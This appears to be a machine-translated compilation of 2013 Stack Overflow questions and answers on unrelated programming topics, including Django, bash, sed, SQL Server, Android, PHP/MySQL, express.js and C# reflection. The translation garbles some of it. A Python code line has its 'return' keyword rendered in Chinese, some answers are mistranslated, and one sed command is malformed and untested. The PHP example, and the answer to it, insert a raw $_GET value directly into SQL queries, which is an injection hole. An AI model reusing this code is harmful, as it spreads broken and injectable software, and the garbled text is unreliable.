我应该尝试在我的 ExamDate 模型中设置默认顺序吗？我真的不喜欢那个解决方案:(

蒂亚！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:45:04.177

经过一番搜索，我找到了解决方案！

我忽略了 queryset 属性并将以下方法添加到 BaseExamDateFormSet：

```
def get_queryset(self):
    返回 models.ExamDate.objects.all().order_by('exam_date')

```

但是我还不知道为什么 queryset 属性不起作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-12T12:13:27.433

更简单的是，在上面的代码中，您可以删除 modelformset_factory 调用中的 formset= 参数并将您的 formset 实例化为：

```
formset = ExamDateFormSet(queryset=models.ExamDate.objects.order_by('exam_date')) 
```

# javascript - 在 ExtJS 中检索运行时组件维度

> ID：15244197
> 
> 赞同：1
> 
> 时间：2013-03-06T10:03:07.597
> 
> 标签：javascript, extjs4

渲染组件后，如何获取宽度和高度？我试过`.getWidth()`and `.getHeight()`，但它返回配置属性的值。似乎它们只是配置选项的吸气`width`剂。`height`

我想要的是组件在显示或渲染后的宽度和高度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:24:06.743

使用[.getEl()](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.Component-method-getEl)检索顶级元素。而不是使用元素的`getWidth`方法：

```
var width = yourComponent.getEl().getWidth(); 
```

这将为您提供实际 DOM 元素的宽度。

# dde - dde 回调函数不起作用

> ID：15244210
> 
> 赞同：1
> 
> 时间：2013-03-06T10:03:37.497
> 
> 标签：dde

这就是问题所在：
我编写了一个程序来接收来自 StockClient 的数据。
当我使用时`DDESpy`，我可以看到诸如

```
Time:xxxx hwndTo=0xe00b0 Message(Posted)=Data:<br>
 hwndFrom=0x1f06dc, status=2000(fRelease ) fmt=0x1("CF_TEXT")<br>
 Data=          "value"<br>
 Item=          "xxxxx"<br> 
```

但是我的 ddecallback 函数不起作用（有时它可以起作用），为什么？

`DdeInitialize( &_dde_inst, dde_callback, APPCMD_CLIENTONLY/*|CBF_FAIL_ALLSVRXACTIONS*/, 0 ); HSZ _server = DdeCreateStringHandle ( _dde_inst, "DDEServer", CP_WINANSI ); if( !_server ) return -1;`

```
HSZ _topic = DdeCreateStringHandle( _dde_inst, "TOPIC1", CP_WINANSI );
HCONV _conv = DdeConnect( _dde_inst, _server, _topic, NULL );
if( !_conv )
    return -1;

for( int i = 0; i < ITEM_NUM; ++i )
{
    HSZ _item = DdeCreateStringHandle( _dde_inst, _list[i], CP_WINANSI );
    if( _item )
    {
        DWORD _result;
        HDDEDATA _data = DdeClientTransaction( NULL, NULL, _conv, _item, CF_TEXT, XTYP_ADVSTART, TIMEOUT_ASYNC, &_result );
        UINT _error = DdeGetLastError(_dde_inst );
        DdeFreeStringHandle( _dde_inst, _item );
        int _reserve = DMLERR_NO_ERROR;
        if( _error != 0 )
        {
            fprintf( stdout, "dde error = %d\n", _error );
            continue;
        }
    }
} 
```

# sharepoint - 我的 SharePoint 2013 项目的环境设置和开发工具

> ID：15244212
> 
> 赞同：1
> 
> 时间：2013-03-06T10:03:41.457
> 
> 标签：sharepoint, iis

我想开始我的第一个 SharePoint 项目来构建内部和外部系统：-

因此，我准备获取以下内容来设置开发环境并发布实时 SharePoint 应用程序：-

1.  SharePoint Server 2013 标准版。至于现在，我们不需要 e-discover、BI、品牌等企业功能。

2.  Windows server 2012 & IIS 分别作为操作系统和托管服务器。

3.  用于数据库的 SQL Server 2012 或 2008

4.  Visual Studio Professional 2012 用于开发 Web 部件和使用 SharePoint 模板。
5.  Team Foundation Server 2012 提供版本控制、错误跟踪等。

如果我缺少开发和实施实时 Internet 和 Intranet SharePoint 应用程序所需的任何工具或软件，任何人都可以提出建议。

第二个问题我应该使用office 365吗？

最好的祝福

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T09:12:16.737

开始开发 SharePoint 应用程序似乎已经足够了。[您可能需要 SharePoint Designer 2013。您还可以在我的博客文章 ( http://keremozen.com/2012/12/28/hardware-requirements-for-sharepoint-](http://keremozen.com/2012/12/28/hardware-requirements-for-sharepoint-2013-development/) ) 中找到 SharePoint 开发环境的最佳硬件要求[2013-开发/](http://keremozen.com/2012/12/28/hardware-requirements-for-sharepoint-2013-development/)）。

Office 365 或本地安装选择完全取决于您的需求。Office 365 安装提供了简单的设置、可维护性、可扩展性和安全性。您的网站可以 24x7 全天候访问。如果您想完全控制您的网站，您可以选择本地安装。

问候

# linux - Linux：使用参数作为文件快捷方式

> ID：15244213
> 
> 赞同：3
> 
> 时间：2013-03-06T10:03:41.763
> 
> 标签：linux, bash, parameter-passing

**祝大家好运**:)

我正在尝试制作一个linux脚本。该脚本应使用一个参数调用，即存储在我的主目录中的文件。我似乎无法使用

```
cat $var1 >> $1 
```

所以我有这个变量 $var1 我想把它保存在一个确实存在的文件中，它的名字在**$1**

请任何人帮助我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:09:19.517

该[`cat`命令](http://linux.die.net/man/1/cat)显示文件的内容。

除非 的值`$var1`是您要“复制”到的文件`$1`，否则它将不起作用（可能会给出“找不到文件”的错误）。

我能想到的最简单的解决方案是[`echo`](http://linux.die.net/man/1/echo)变量：

```
echo "$var1" >> "$1" 
```

正如[@glglgl](https://stackoverflow.com/users/296974/glglgl)所述，最好将变量放在双引号之间。它们可以防止空格在将参数拆分为多个参数时弄乱命令

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:12:49.870

然后，您想创建一个脚本，将内容保存在您指定为参数的文件中。

```
file_name=$1 #you get the parameter

...do things...

echo "everything you've done" >> $file_name #case want to append
echo "everything you've done"  > $file_name #case want to overwrite 
```

# regex - 使用 sed 将字符串逐行替换为正则表达式

> ID：15244214
> 
> 赞同：2
> 
> 时间：2013-03-06T10:03:42.230
> 
> 标签：regex, command-line, sed

我试图对一个 clex 文件做一些操作，格式如下：

```
name:{id:xxx, ... ...} alias: aaa;
name:{id:yyy, ... ...} alias: bbb;
name:{id:zzz, ... ...} alias: ccc; 
```

我需要做的是将名称后的内容替换为别名后的内容。所以结果应该是：

```
name:{id:aaa, ... ...} alias: aaa;
name:{id:bbb, ... ...} alias: bbb;
name:{id:ccc, ... ...} alias: ccc; 
```

我可以使用 sed 完成操作吗？我尝试使用正则表达式但失败了。然后我尝试使用 for 循环：

```
readarray lines < "$file"

for line in "${lines[@]}"; 
do
    ???
done 
```

但是对于如何做更换事情感到很挣扎。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:10:04.333

试试这一行：

```
sed -r 's/(name:\{id:)[^,]*(.*alias: )([^;]*);/\1\3\2\3;/' file 
```

使用您的示例数据：

```
kent$  echo "name:{id:xxx, ... ...} alias: aaa;
name:{id:yyy, ... ...} alias: bbb;
name:{id:zzz, ... ...} alias: ccc;"|sed -r 's/(name:\{id:)[^,]*(.*alias: )([^;]*);/\1\3\2\3;/'
name:{id:aaa, ... ...} alias: aaa;
name:{id:bbb, ... ...} alias: bbb;
name:{id:ccc, ... ...} alias: ccc; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:10:55.930

您可以将 sed 与以下内容一起使用：

```
s/(name:\{id:)[^,]*,(.*)(alias: )([^;]*)/\1\4,\2\3\4/g 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:11:00.460

`sed 's/name:{id:[a-z],+(.*)alias: ([a_z]+)/name:{id:\2,\1/alias: \1/`

我给你的是未经测试的，一些控制字符可能需要转义。您可以调整`[a-z]+`以匹配您的别名匹配。

# sql - 使用子查询的 SQL Server 行到列

> ID：15244219
> 
> 赞同：2
> 
> 时间：2013-03-06T10:04:08.850
> 
> 标签：sql, sql-server

我尝试使用逗号分隔的行进入列，但是如何使用子查询来实现这一点，我在 oracle 中实现了这一点。

**SQL 服务器：**

```
DECLARE @listStr VARCHAR(MAX)
SELECT @listStr = COALESCE(@listStr+',' ,'') + email
FROM RDT_USER
SELECT @listStr 
```

**甲骨文：**

```
 SELECT RTRIM(XMLAGG(XMLELEMENT(E, EMAIL || ',')).EXTRACT('//text()'), ',') AS RECEIVERID 
    FROM (SELECT DISTINCT (EMAIL) AS EMAIL
          FROM RDT_USER
        ) 
```

**预期输出：**

```
j1@gmail.com,j2@gmail.com,j3@gmail.com,j4@gmail.com 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:12:42.547

你可以使用这个：

```
DECLARE @listStr VARCHAR(MAX) =
    STUFF(
        (
        SELECT  DISTINCT ',' + email
        FROM    RDT_USER
        FOR XML PATH(''), TYPE
        ).value('.', 'VARCHAR(MAX)')
        ,1,1,'')

SELECT @listStr 
```

如果您只想选择没有变量，这应该可以：

```
SELECT 
    STUFF(
        (
        SELECT  DISTINCT ',' + email
        FROM    RDT_USER
        FOR XML PATH(''), TYPE
        ).value('.', 'VARCHAR(MAX)')
        ,1,1,'') 
```

# eclipse - ClassNotFoundException oracle.jdbc.driver.OracleDriver 仅在 servlet 中，使用 Eclipse 和 oracle

> ID：15244220
> 
> 赞同：0
> 
> 时间：2013-03-06T10:04:12.690
> 
> 标签：eclipse

下面的代码在线失败：`Class.forName("oracle.jdbc.driver.OracleDriver");` 出现错误：

```
java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver 
```

这两个 printlns 打印：`Wed_Jun_22_11:18:51_PDT_2005 false`这让我觉得这个类存在并且可以找到。同样，这个完全相同的类也适用于非 servlet 应用程序。

我已经多次重新启动所有内容并多次重新生成应用程序/servlet。所有值都经过硬编码，使其简单而简短。

我正在使用：Eclipse JavaEE 1.4.2 Tomcat 7 jdk1.7 Oracle 11g R2 Windows 7 64bit

我已经在 web-inf 中添加了 jar 文件。但它仍然给出以下错误：`java.lang.NoClassDefFoundError: oracle/jdbc/driver/OracleDriver`。

任何建议都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:20:22.137

如果不查看您的应用程序和 tomcat 服务器，很难判断到底出了什么问题。但是有一些提示可以解决您的问题。

1.  `NoClassDefFoundError`总是让我觉得有类冲突而不是**缺少 jar 文件**。`ClassNotFound`注意和之间的区别`NoClassDefFoundError`

2.  tomcat 以与普通 java 应用程序不同的方式加载类。通常情况下，Java 应用程序中的类加载器将遵循**委托模式**，这意味着子类加载器将始终将类加载作业委托给其父类加载器。但是tomcat并不完全遵循这一点。所以它将自己加载（查找源文件，读取字节码并创建类**Class**的实例）。

所以检查你的tomcat lib以及tomcat下的所有web应用，看看是否有多个版本的**ojdbcXXX.jar**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-20T08:02:12.567

通过 C:\apache-tomcat-7.0.47\lib 路径（此路径可能不同 -> 基于您粘贴 Tomcat 服务器的位置）然后通过 ojdbc14.jar 如果它不包含。

然后在 Eclipse 中重新启动服务器，然后在服务器上运行您的应用程序

# android - 如何从列表中获取单个值 在安卓中

> ID：15244221
> 
> 赞同：0
> 
> 时间：2013-03-06T10:04:13.017
> 
> 标签：android, sqlite, cursor, android-sqlite

`ArrayList<>`我想获取以from形式返回的单列值，`SQLite`用于检索数据我的代码是：

```
 public List<ContentDataObject> findAll() {
    List<ContentDataObject> contentDataObjects = new ArrayList<ContentDataObject>();
    String selectQuery = "SELECT " +
            DBHelper.MOBILE_CONTENT_FULLTEXT+ 
            " FROM " + DBHelper.MOBILE_CONTENT_TABLE_NAME;
    database = dbOpenHelper.getReadableDatabase();
    try {
        Cursor cursor = database.rawQuery(selectQuery, null);
        Log.i(TAG, "Returned " + cursor.getCount() + " rows");

        if(cursor != null){
            cursor.moveToFirst();
            while (!cursor.isAfterLast()) {
                ContentDataObject contentDataObject = check(cursor);
                contentDataObjects.add(contentDataObject);
                cursor.moveToNext();                    
            }
            // Make sure to close the cursor
            cursor.close();
        }           
    } catch (Exception e) {
        // TODO: handle exception
    }
    return contentDataObjects;
} 
```

我`check(cursor)`的是：

```
public ContentDataObject check(Cursor cursor) {

    ContentDataObject contentDataObject = new ContentDataObject();

    contentDataObject.setId(cursor.getLong(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_ID)));
    contentDataObject.setTitle(cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_TITLE)));
    contentDataObject.setFulltext(cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_FULLTEXT)));
    contentDataObject.setState(cursor.getInt(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_STATE)));
    contentDataObject.setNewValue(cursor.getInt(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_NEW)));
    contentDataObject.setHeader(cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_HEADER)));
    contentDataObject.setColor(cursor.getInt(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_COLOR)));
    contentDataObject.setNext(cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_NEXT)));
    contentDataObject.setPrevious(cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_PREVIOUS)));

    return contentDataObject;

} 
```

在`MainActivity.java`我使用这个代码：

```
ContentDataObject contentDataObject;
TextView textView;

ContentsDataSource dataSource;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    textView = (TextView) findViewById(R.id.myView);

    dataSource = new ContentsDataSource(this);
    dataSource.open();

    List<ContentDataObject> contentDataObjects = dataSource.findAll();

    textView.setText(""+contentDataObjects.indexOf(contentDataObject.getFulltext()));
} 
```

但是，我无法获取数据并设置为`textView`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T15:38:50.323

`List<E>`如果您只想从中获得一个值，我认为您不要使用，`SQLite`因此您应该尝试这个！

`findAll()`以这种方式改变：

```
public String findAll() {
       ^^^^^^   
    String myQuery = "SELECT " +
            DBHelper.MOBILE_CONTENT_FULLTEXT+ 
            " FROM " + DBHelper.MOBILE_CONTENT_TABLE_NAME+
            " WHERE _id = 2";

    Cursor cursor = database.rawQuery(myQuery, null);
    String fullText = null;
            ^^^^^^^^^^^^^^^
    if(cursor.getCount() <= 0) {
        Log.w(TAG, "There is no data to display");
    }
    else {
        fullText = "";

        if(cursor.moveToFirst()) {
            do {
                fullText += cursor.getString(cursor.getColumnIndex(DBHelper.MOBILE_CONTENT_FULLTEXT)) + "\n";
            } while(cursor.moveToNext());
        }// end if          
    }

    return fullText;
    ^^^^^^^^^^^^^^^^     
} 
```

并在`onCreate()`使用中：

```
ContentsDataSource dataSource;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    textView = (TextView) findViewById(R.id.myView);

    dataSource = new ContentsDataSource(this);
    dataSource.open();

    parseAndIsertData();

    textView.setText(dataSource.getFullText());
                     ^^^^^^^^^^^^^^^^^^^^^^^^^
} 
```

我希望这对你有用！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:13:08.483

您的 contentDataObject 从未初始化，因此您实际上是在调用。

```
 textView.setText(""+contentDataObjects.indexOf( NULL )); 
```

# php - 来自数据库的 PHP/Smarty 嵌套数组

> ID：15244227
> 
> 赞同：2
> 
> 时间：2013-03-06T10:04:32.283
> 
> 标签：php, mysql, arrays

好的，我正在尝试通过嵌套查询访问 php/mysql 数据库。

例如。我有 2 张桌子 1）人员和 2）注册。我在注册中有一个推荐 ID 标签。因此，当用户登录时，他应该能够看到在他的 id 下完成的 4 个级别的注册。

表结构

注册号 | 注册号 | 注册类型 | 上线ID | uid |名字 |中间名 | 姓氏 姓氏 等

个人的

编号| uid | 上线 | 名称 | 米名 | 姓名 | 等等以及许多其他细节

现在我这样做是为了达到第一级。

```
$tid=$_GET['tid'];
$con = mysql_connect("localhost","db","password");
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }
else
{  
mysql_select_db("db", $con);
$resulta = mysql_query("SELECT * FROM personal WHERE id=$tid ");
$counta = mysql_num_rows($resulta);
while ($rowa = mysql_fetch_assoc($resulta)) {
$selid=$rowa['uid'];
$amount=$rowa['amountf'];
$plan=$rowa['planname'];
$resultfulla[] = $rowa;
}
$resultb = mysql_query("SELECT * FROM regtab WHERE regtab.upline=$selid " );
$countb = mysql_num_rows($resultb);
$rowz=array();
while ($rowb = mysql_fetch_assoc($resultb)) {
$rowz[] = $rowb;
} 
```

现在我可以达到一个级别，但是我如何循环第二个数组和稍后将产生的数组以获得树结构。或者这样......任何帮助......

使用数组 rowz 我可以存储我已经完成的第一行注册的结果。现在使用这个数组，我需要找出如何获得在数组 rowz 下面完成的第二行注册.....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:09:55.323

加入您的查询并获得结果。

```
$sql = "SELECT * FROM personal 
        LEFT JOIN regtab ON regtab.upline = personal.uid
        WHERE personal .id=".$tid; 
```

在 php.ini 中获取所有结果。

# asp.net-mvc - 在 Asp.net MVC 中运行 express.js 应用程序

> ID：15244236
> 
> 赞同：0
> 
> 时间：2013-03-06T10:04:55.817
> 
> 标签：asp.net-mvc, node.js, hosting, iis-express, iisnode

我想用 asp.net mvc 运行 node.js 来执行 socket.io 操作。

我已经成功地将 node.js 包含在 asp.net mvc 中，如此[处所述](http://weblogs.asp.net/jgalloway/archive/2011/10/26/using-node-js-in-an-asp-net-mvc-application-with-iisnode.aspx)

我的问题是如何在 asp.net mvc 中运行 express.js，

我已经在 Global.asax.cs 文件中执行了 url 重写，例如

void Application_BeginRequest(object sender, EventArgs e)
{
// 获取当前路径
字符串 CurrentPath = Request.Path.ToLower();
if (CurrentPath.StartsWith("/node"))
{ HttpContext MyContext = HttpContext.Current;
MyContext.RewritePath("/Node/index.js/");
}
}

所以在 url **http:localhost:1234/node**应该将我重定向到 Node 文件夹中的 index.js 文件

一切正常，但是，当我开始在 index.js 中编写 express.js 服务器时

var express = require('express');

var app = express.createServer();

app.get('/node/', function(req, res) {
res.send('欢迎表达');
});

app.listen(process.env.PORT);

我收到错误**提示无法获取 /Node/index.js/**

我在哪里失踪？请指导我如何在 asp.net mvc 中编写 express.js 编码

我正在使用 IIS 8.0 express 在 windows 7 32 位系统中运行此应用程序，并且安装的节点版本是
iisnode.js - iisnode-full-iis7-v0.2.3-x86
node.js - node-v0.8.19-x86

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T03:37:33.227

你有 iisnode 处理 index.js 的 web.config 条目吗？

默认情况下，iisnode 未设置为 .js 处理程序，因为客户端 javascript 比服务器端 javascript 多得多，因此您需要显式打开 iisnode 作为该文件的处理程序。

# asp.net - 将查询写入数据表选择的方法

> ID：15244238
> 
> 赞同：2
> 
> 时间：2013-03-06T10:04:58.633
> 
> 标签：asp.net, sql-server-2008, datatable

如何编写查询

```
Select Top 1 from tablename
OrderBy Desc 
```

进入

数据表我有一个代码：

```
DataRow[] ClassDetail = dt.Select("TOP 1 DESC"); 
```

但它不执行。感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:21:57.917

您可以为此使用 linq

```
DataTable dt = new DataTable(); 
```

选项1：

```
List<DataRow> rows1 = dt.Rows.Cast<System.Data.DataRow>().OrderByDescending(a => a["MyColumn"]).Take(1).ToList(); 
```

选项2：

```
List<DataRow> rows2 = dt.AsEnumerable().OrderByDescending(a => a["MyColumn"]).Take(1).ToList(); 
```

# javascript - 动态更改母版页中的菜单类别

> ID：15244240
> 
> 赞同：4
> 
> 时间：2013-03-06T10:05:01.497
> 
> 标签：javascript, asp.net

如何从子页面更改母版页中菜单的 CSS 类名称？当任何子菜单形式打开时，我想将课程更改为“活动”，

是否有任何可用的 C# 或 JavaScript 代码？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:18:13.983

通过理解您的问题，我认为您想在页面更改时更改 li 的类或菜单中使用的任何标签。

请在母版页 page_load 下添加以下 c# 代码。

```
 string thisURL = this.Page.GetType().Name.ToString();       
        switch (thisURL)
        {
            case "home_aspx":
                lihome.Attributes.Add("class", "Active");                
                break;
         case "support_aspx":
                lisupport.Attributes.Add("class", "Active");
                break;
         case "logout_aspx":
                lilogout.Attributes.Add("class", "Active");
                break;
         } 
```

而不是 li，使用您在菜单中使用的任何标签的 id。

# perl - 查找文件中的共同元素

> ID：15244241
> 
> 赞同：1
> 
> 时间：2013-03-06T10:05:08.557
> 
> 标签：perl

我想写的程序和[文件行对抗](https://stackoverflow.com/questions/15203765/file-row-confrontation/15205173#15205173)的目的是一样的。这次我的文件以不同的方式放置：

```
1 2
1 3
1 4
2 1
2 3
2 4
2 5
3 1
...
8 6
8 7
8 9
9 8 
```

我想找到：

1.  当一行的第一个元素出现在其他行的第二个位置时，并且如果后续行的第一个元素出现在考试行的旁边；
2.  如果找到了，那么我想打印“我找到了链接 x y”；
3.  如果“链接”存在，那么我想计算他们共享多少个“邻居”，这里的 eighbours 是指他们在第二列中有多少个共同元素并打印“我找到了 z 个三角形”。

文件已排序。

在这种情况下，程序将开始在文件中创建第一个“对”1 2，但相反，它将在第 4 行 (2 1) 找到它。然后查看 3（第二行和 1 的邻居）是否也存在于 2 中（因为它存在 2 3）等等。最后它会发现“有链接 1 2”并且它“找到了 2 个三角形”（1 - 2 - 3 和 1 - 2 - 4）。我认为答案与上面链接中的答案没有太大区别，但我不知道如何从这样制作的文件中排列文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T22:44:17.353

问题的第一部分是只找到反向匹配对的索引？昨天阅读这个问题时，我感觉 grep 可能有用；

```
#!usr/bin/perl

use warnings;
use strict;

my @parry;

while (<DATA>){
push @parry, [split(' ',$_)];
}

#@remind is reverse matched indices;

my @remind = grep {
my $ind = $_;
   grep {  #reverse @{$parry[$_]} == @{parry[$ind]} did not appear to work.

      @{$parry[$_]}[0] == @{$parry[$ind]}[1] && 
      @{$parry[$_]}[1] == @{$parry[$ind]}[0];

   } 0..$#parry 

} 0..$#parry;

grep { print $_,': ',@{$parry[$_]},$/ } @remind;

__END__
1 2
1 3
1 4
2 1
2 3
2 4
2 5
3 1
8 6
8 7
8 9
9 8 
```

输出是

```
0: 12
1: 13
3: 21
7: 31
10: 89
11: 98 
```

然后你想从这里找到 7[0] 7[1] (3 1) 与邻居行 6 和 8 与 col 2？

```
 6[1]
     7[1] (1 5) and/or

     7[1] (1 6) exist in the original set (in @parry)?
     8[1] 
```

他们没有那么没有三角形。

# migration - 迁移 ATFile 时出现 plone.app.blob RuntimeError

> ID：15244244
> 
> 赞同：3
> 
> 时间：2013-03-06T10:05:17.813
> 
> 标签：migration, plone, blob, runtime-error

我正在将 blob 迁移到 3.2.1 站点，并且收到“RuntimeError：调用 Python 对象错误时超出最大递归深度”。在@@blob-file-migration 期间的某个文件上。

我找到了这个[http://svn.eionet.europa.eu/projects/Zope/ticket/4190](http://svn.eionet.europa.eu/projects/Zope/ticket/4190)，看起来他们通过创建自定义迁移器解决了这个图像问题。

有什么线索吗？追溯如下。

```
 File "/home/simahawk/dev/plone/plone3/projx/src/plone.app.blob/src/plone/app/blob/content.py", line 113, in setFile
    mutator = self.getField('file').getMutator(self)
  File "/home/simahawk/dev/plone/plone3/buildout/eggs/Products.Archetypes-1.5.10-py2.4.egg/Products/Archetypes/BaseObject.py", line 241, in getField
    return self.Schema().get(key)
  File "/home/simahawk/dev/plone/plone3/buildout/eggs/Products.Archetypes-1.5.10-py2.4.egg/Products/Archetypes/BaseObject.py", line 828, in Schema
    schema = ISchema(self)
  File "/home/simahawk/dev/plone/plone3/projx/parts/zope2/lib/python/zope/app/component/hooks.py", line 96, in adapter_hook
    return siteinfo.adapter_hook(interface, object, name, default)
  File "/home/simahawk/dev/plone/plone3/buildout/eggs/archetypes.schemaextender-2.1.1-py2.4.egg/archetypes/schemaextender/extender.py", line 143, in cachingInstanceSchemaFactory
    key = IUUID(context, str(id(context)))
  File "/home/simahawk/dev/plone/plone3/projx/parts/zope2/lib/python/zope/app/component/hooks.py", line 96, in adapter_hook
    return siteinfo.adapter_hook(interface, object, name, default)
RuntimeError: maximum recursion depth exceeded in cmp
2013-03-06 10:16:49 INFO ATCT.migration Rolling back to last safe point 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:01:51.850

当使用 Products.contentmigration 从 Plone 3.x 迁移到 Plone 4.x 时，我得到了同样的错误。plone.app.blob 迁移中似乎存在错误。我们进行了此自定义迁移以绕过递归错误：[http ://svn.eionet.europa.eu/projects/Zope/browser/trunk/Products.EEAPloneAdmin/trunk/Products/EEAPloneAdmin/Extensions/ImageFS2Image.py?rev=29656](http://svn.eionet.europa.eu/projects/Zope/browser/trunk/Products.EEAPloneAdmin/trunk/Products/EEAPloneAdmin/Extensions/ImageFS2Image.py?rev=29656)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T08:37:03.400

问题是 at.schemaextender 版本（2.1.1）。向下固定到 1.6.0 解决了这个问题。这也解决了 3.3.5 站点上的随机 KeyError。我认为这与[#12051](https://dev.plone.org/ticket/12051)和[#11396 有关](https://dev.plone.org/ticket/11396)。看起来这些是较新版本的 at.schemaextender 的常见问题，但在包的自述文件中没有 Plone 3.x 的信息。

# c# - C# 中的元编程：自动 ToString 方法

> ID：15244250
> 
> 赞同：8
> 
> 时间：2013-03-06T10:05:34.817
> 
> 标签：c#, metaprogramming

我有一些只用于包含数据的类。例如

```
public class EntityAdresse : IEntityADRESSE
{
    public string Name1 { get; set; }
    public string Strasse { get; set; }
    public string Plz { get; set; }
    public string Ort { get; set; }
    public string NatelD { get; set; }
    public string Mail { get; set; }
    public int Id_anrede { get; set; }
    public string Telefon { get; set; }
    public int Id_adr { get; set; }
    public int Cis_adr { get; set; }
} 
```

这代表一个地址。就像我说的，它只包含数据。没有方法（我知道界面在这里没有意义......）

现在我需要为所有这些实体类实现 ToString 并且它们有很多。

我的问题是：C# 中是否有一个元编程功能可以自动生成这个 tostring 方法？我不想为这些类中的每一个编写样板代码。

或者，我也可以编写一个 perl 或 python 脚本来生成代码。但我更喜欢直接在 C# 中进行。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-06T10:14:11.910

通常，您需要获取类的所有属性值并将它们组合成一个字符串。这可以使用以下方法完成：

```
public override string ToString() 
{
    PropertyDescriptorCollection coll = TypeDescriptor.GetProperties(this);
    StringBuilder builder = new StringBuilder();
    foreach(PropertyDescriptor pd in coll)
    {
        builder.Append(string.Format("{0} : {1}", pd.Name , pd.GetValue(this).ToString()));
    }
    return builder.ToString();
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T10:17:14.197

该功能称为反射。一个最简单的例子是：

```
 public class EntityBase
  {
      public override string ToString()
      {
          StringBuilder sb = new StringBuilder();

          foreach ( var property in this.GetType().GetProperties() )
          {
              sb.Append( property.GetValue( this, null ) );
          }

          return sb.ToString();
      } 
  }

  public class TheEntity : EntityBase
  {
      public string Foo { get; set; }
      public string Bar { get; set; }
  } 
```

请对其进行微调以满足您的要求。

如您所见，这个想法是在基类中有一个实现，以便所有后代自动继承相同的行为。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:19:07.343

语言中没有内置的功能可以自动执行此操作，但是您可以编写一个库来执行此操作，使用`Expression`框架中的功能生成一个函数来执行此操作。

你会有这样的功能：

```
Func<T,string> GenerateToString<T>() 
```

在你的课堂上，你有这样的东西：

```
public class EntityAdresse : IEntityADRESSE
{
    private static readonly Func<EntityAdresse,string> s_ToString=Generator.GenerateToString<EntityAdresse>();

    public string Name1 { get; set; }
    public string Strasse { get; set; }
    public string Plz { get; set; }
    public string Ort { get; set; }
    public string NatelD { get; set; }
    public string Mail { get; set; }
    public int Id_anrede { get; set; }
    public string Telefon { get; set; }
    public int Id_adr { get; set; }
    public int Cis_adr { get; set; }

    public override ToString()
    {
       return s_ToString(this);
    }
} 
```

挑战是写作`GenerateToString`。使用`Expression`框架和反射，您将能够创建一个与您手动编写代码一样高效的委托。

您可以单独使用反射，但性能损失很快就会成为一个问题。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-04-06T11:57:48.560

有一个用于自动生成 ToString的开源框架[StatePrinter 。](https://github.com/kbilsted/StatePrinter/)它是非常可配置的，因此它应该可以满足您的需求。自省代码可以在[Introspection找到](https://github.com/kbilsted/StatePrinter/blob/master/StatePrinter/Introspection/IntroSpector.cs)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-11-16T23:49:48.397

已经说过的简短版本：

```
public override string ToString()
{
    var propertyStrings = from prop in GetType().GetProperties()
                          select $"{prop.Name}={prop.GetValue(this)}";
    return string.Join(", ", propertyStrings);
} 
```

# highcharts - 在 Highcharts 中使用绘图线比较器

> ID：15244251
> 
> 赞同：1
> 
> 时间：2013-03-06T10:05:35.820
> 
> 标签：highcharts, highstock

我使用 Highchart 显示具有多个系列的倒置图。

HighStock 图表应该更适合我的需要，但我必须将它与 `inverted`仅在 HightChart 中可用的选项一起使用。

如何在我的多系列图表上显示光标后的比较线？

（就像HighStock的[这个例子一样）](http://www.highcharts.com/stock/demo/compare)

第二个问题：为什么highstock和highcharts之间有这么多区别？将这两个世界中更好的一起使用是完美的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:36:11.857

好的，我找到了。

使用工具提示共享选项：

```
tooltip: {  
    shared: true, 
    crosshairs: true 
} 
```

它在倒置图表上也很有效，误解是因为在 HighStock 图表中默认启用此设置。

# iphone - 区分使用 Microsoft Exchange 和 ios 中其他服务器的 ipad 联系人和同步联系人

> ID：15244252
> 
> 赞同：1
> 
> 时间：2013-03-06T10:05:35.893
> 
> 标签：iphone, ios, objective-c, ipad

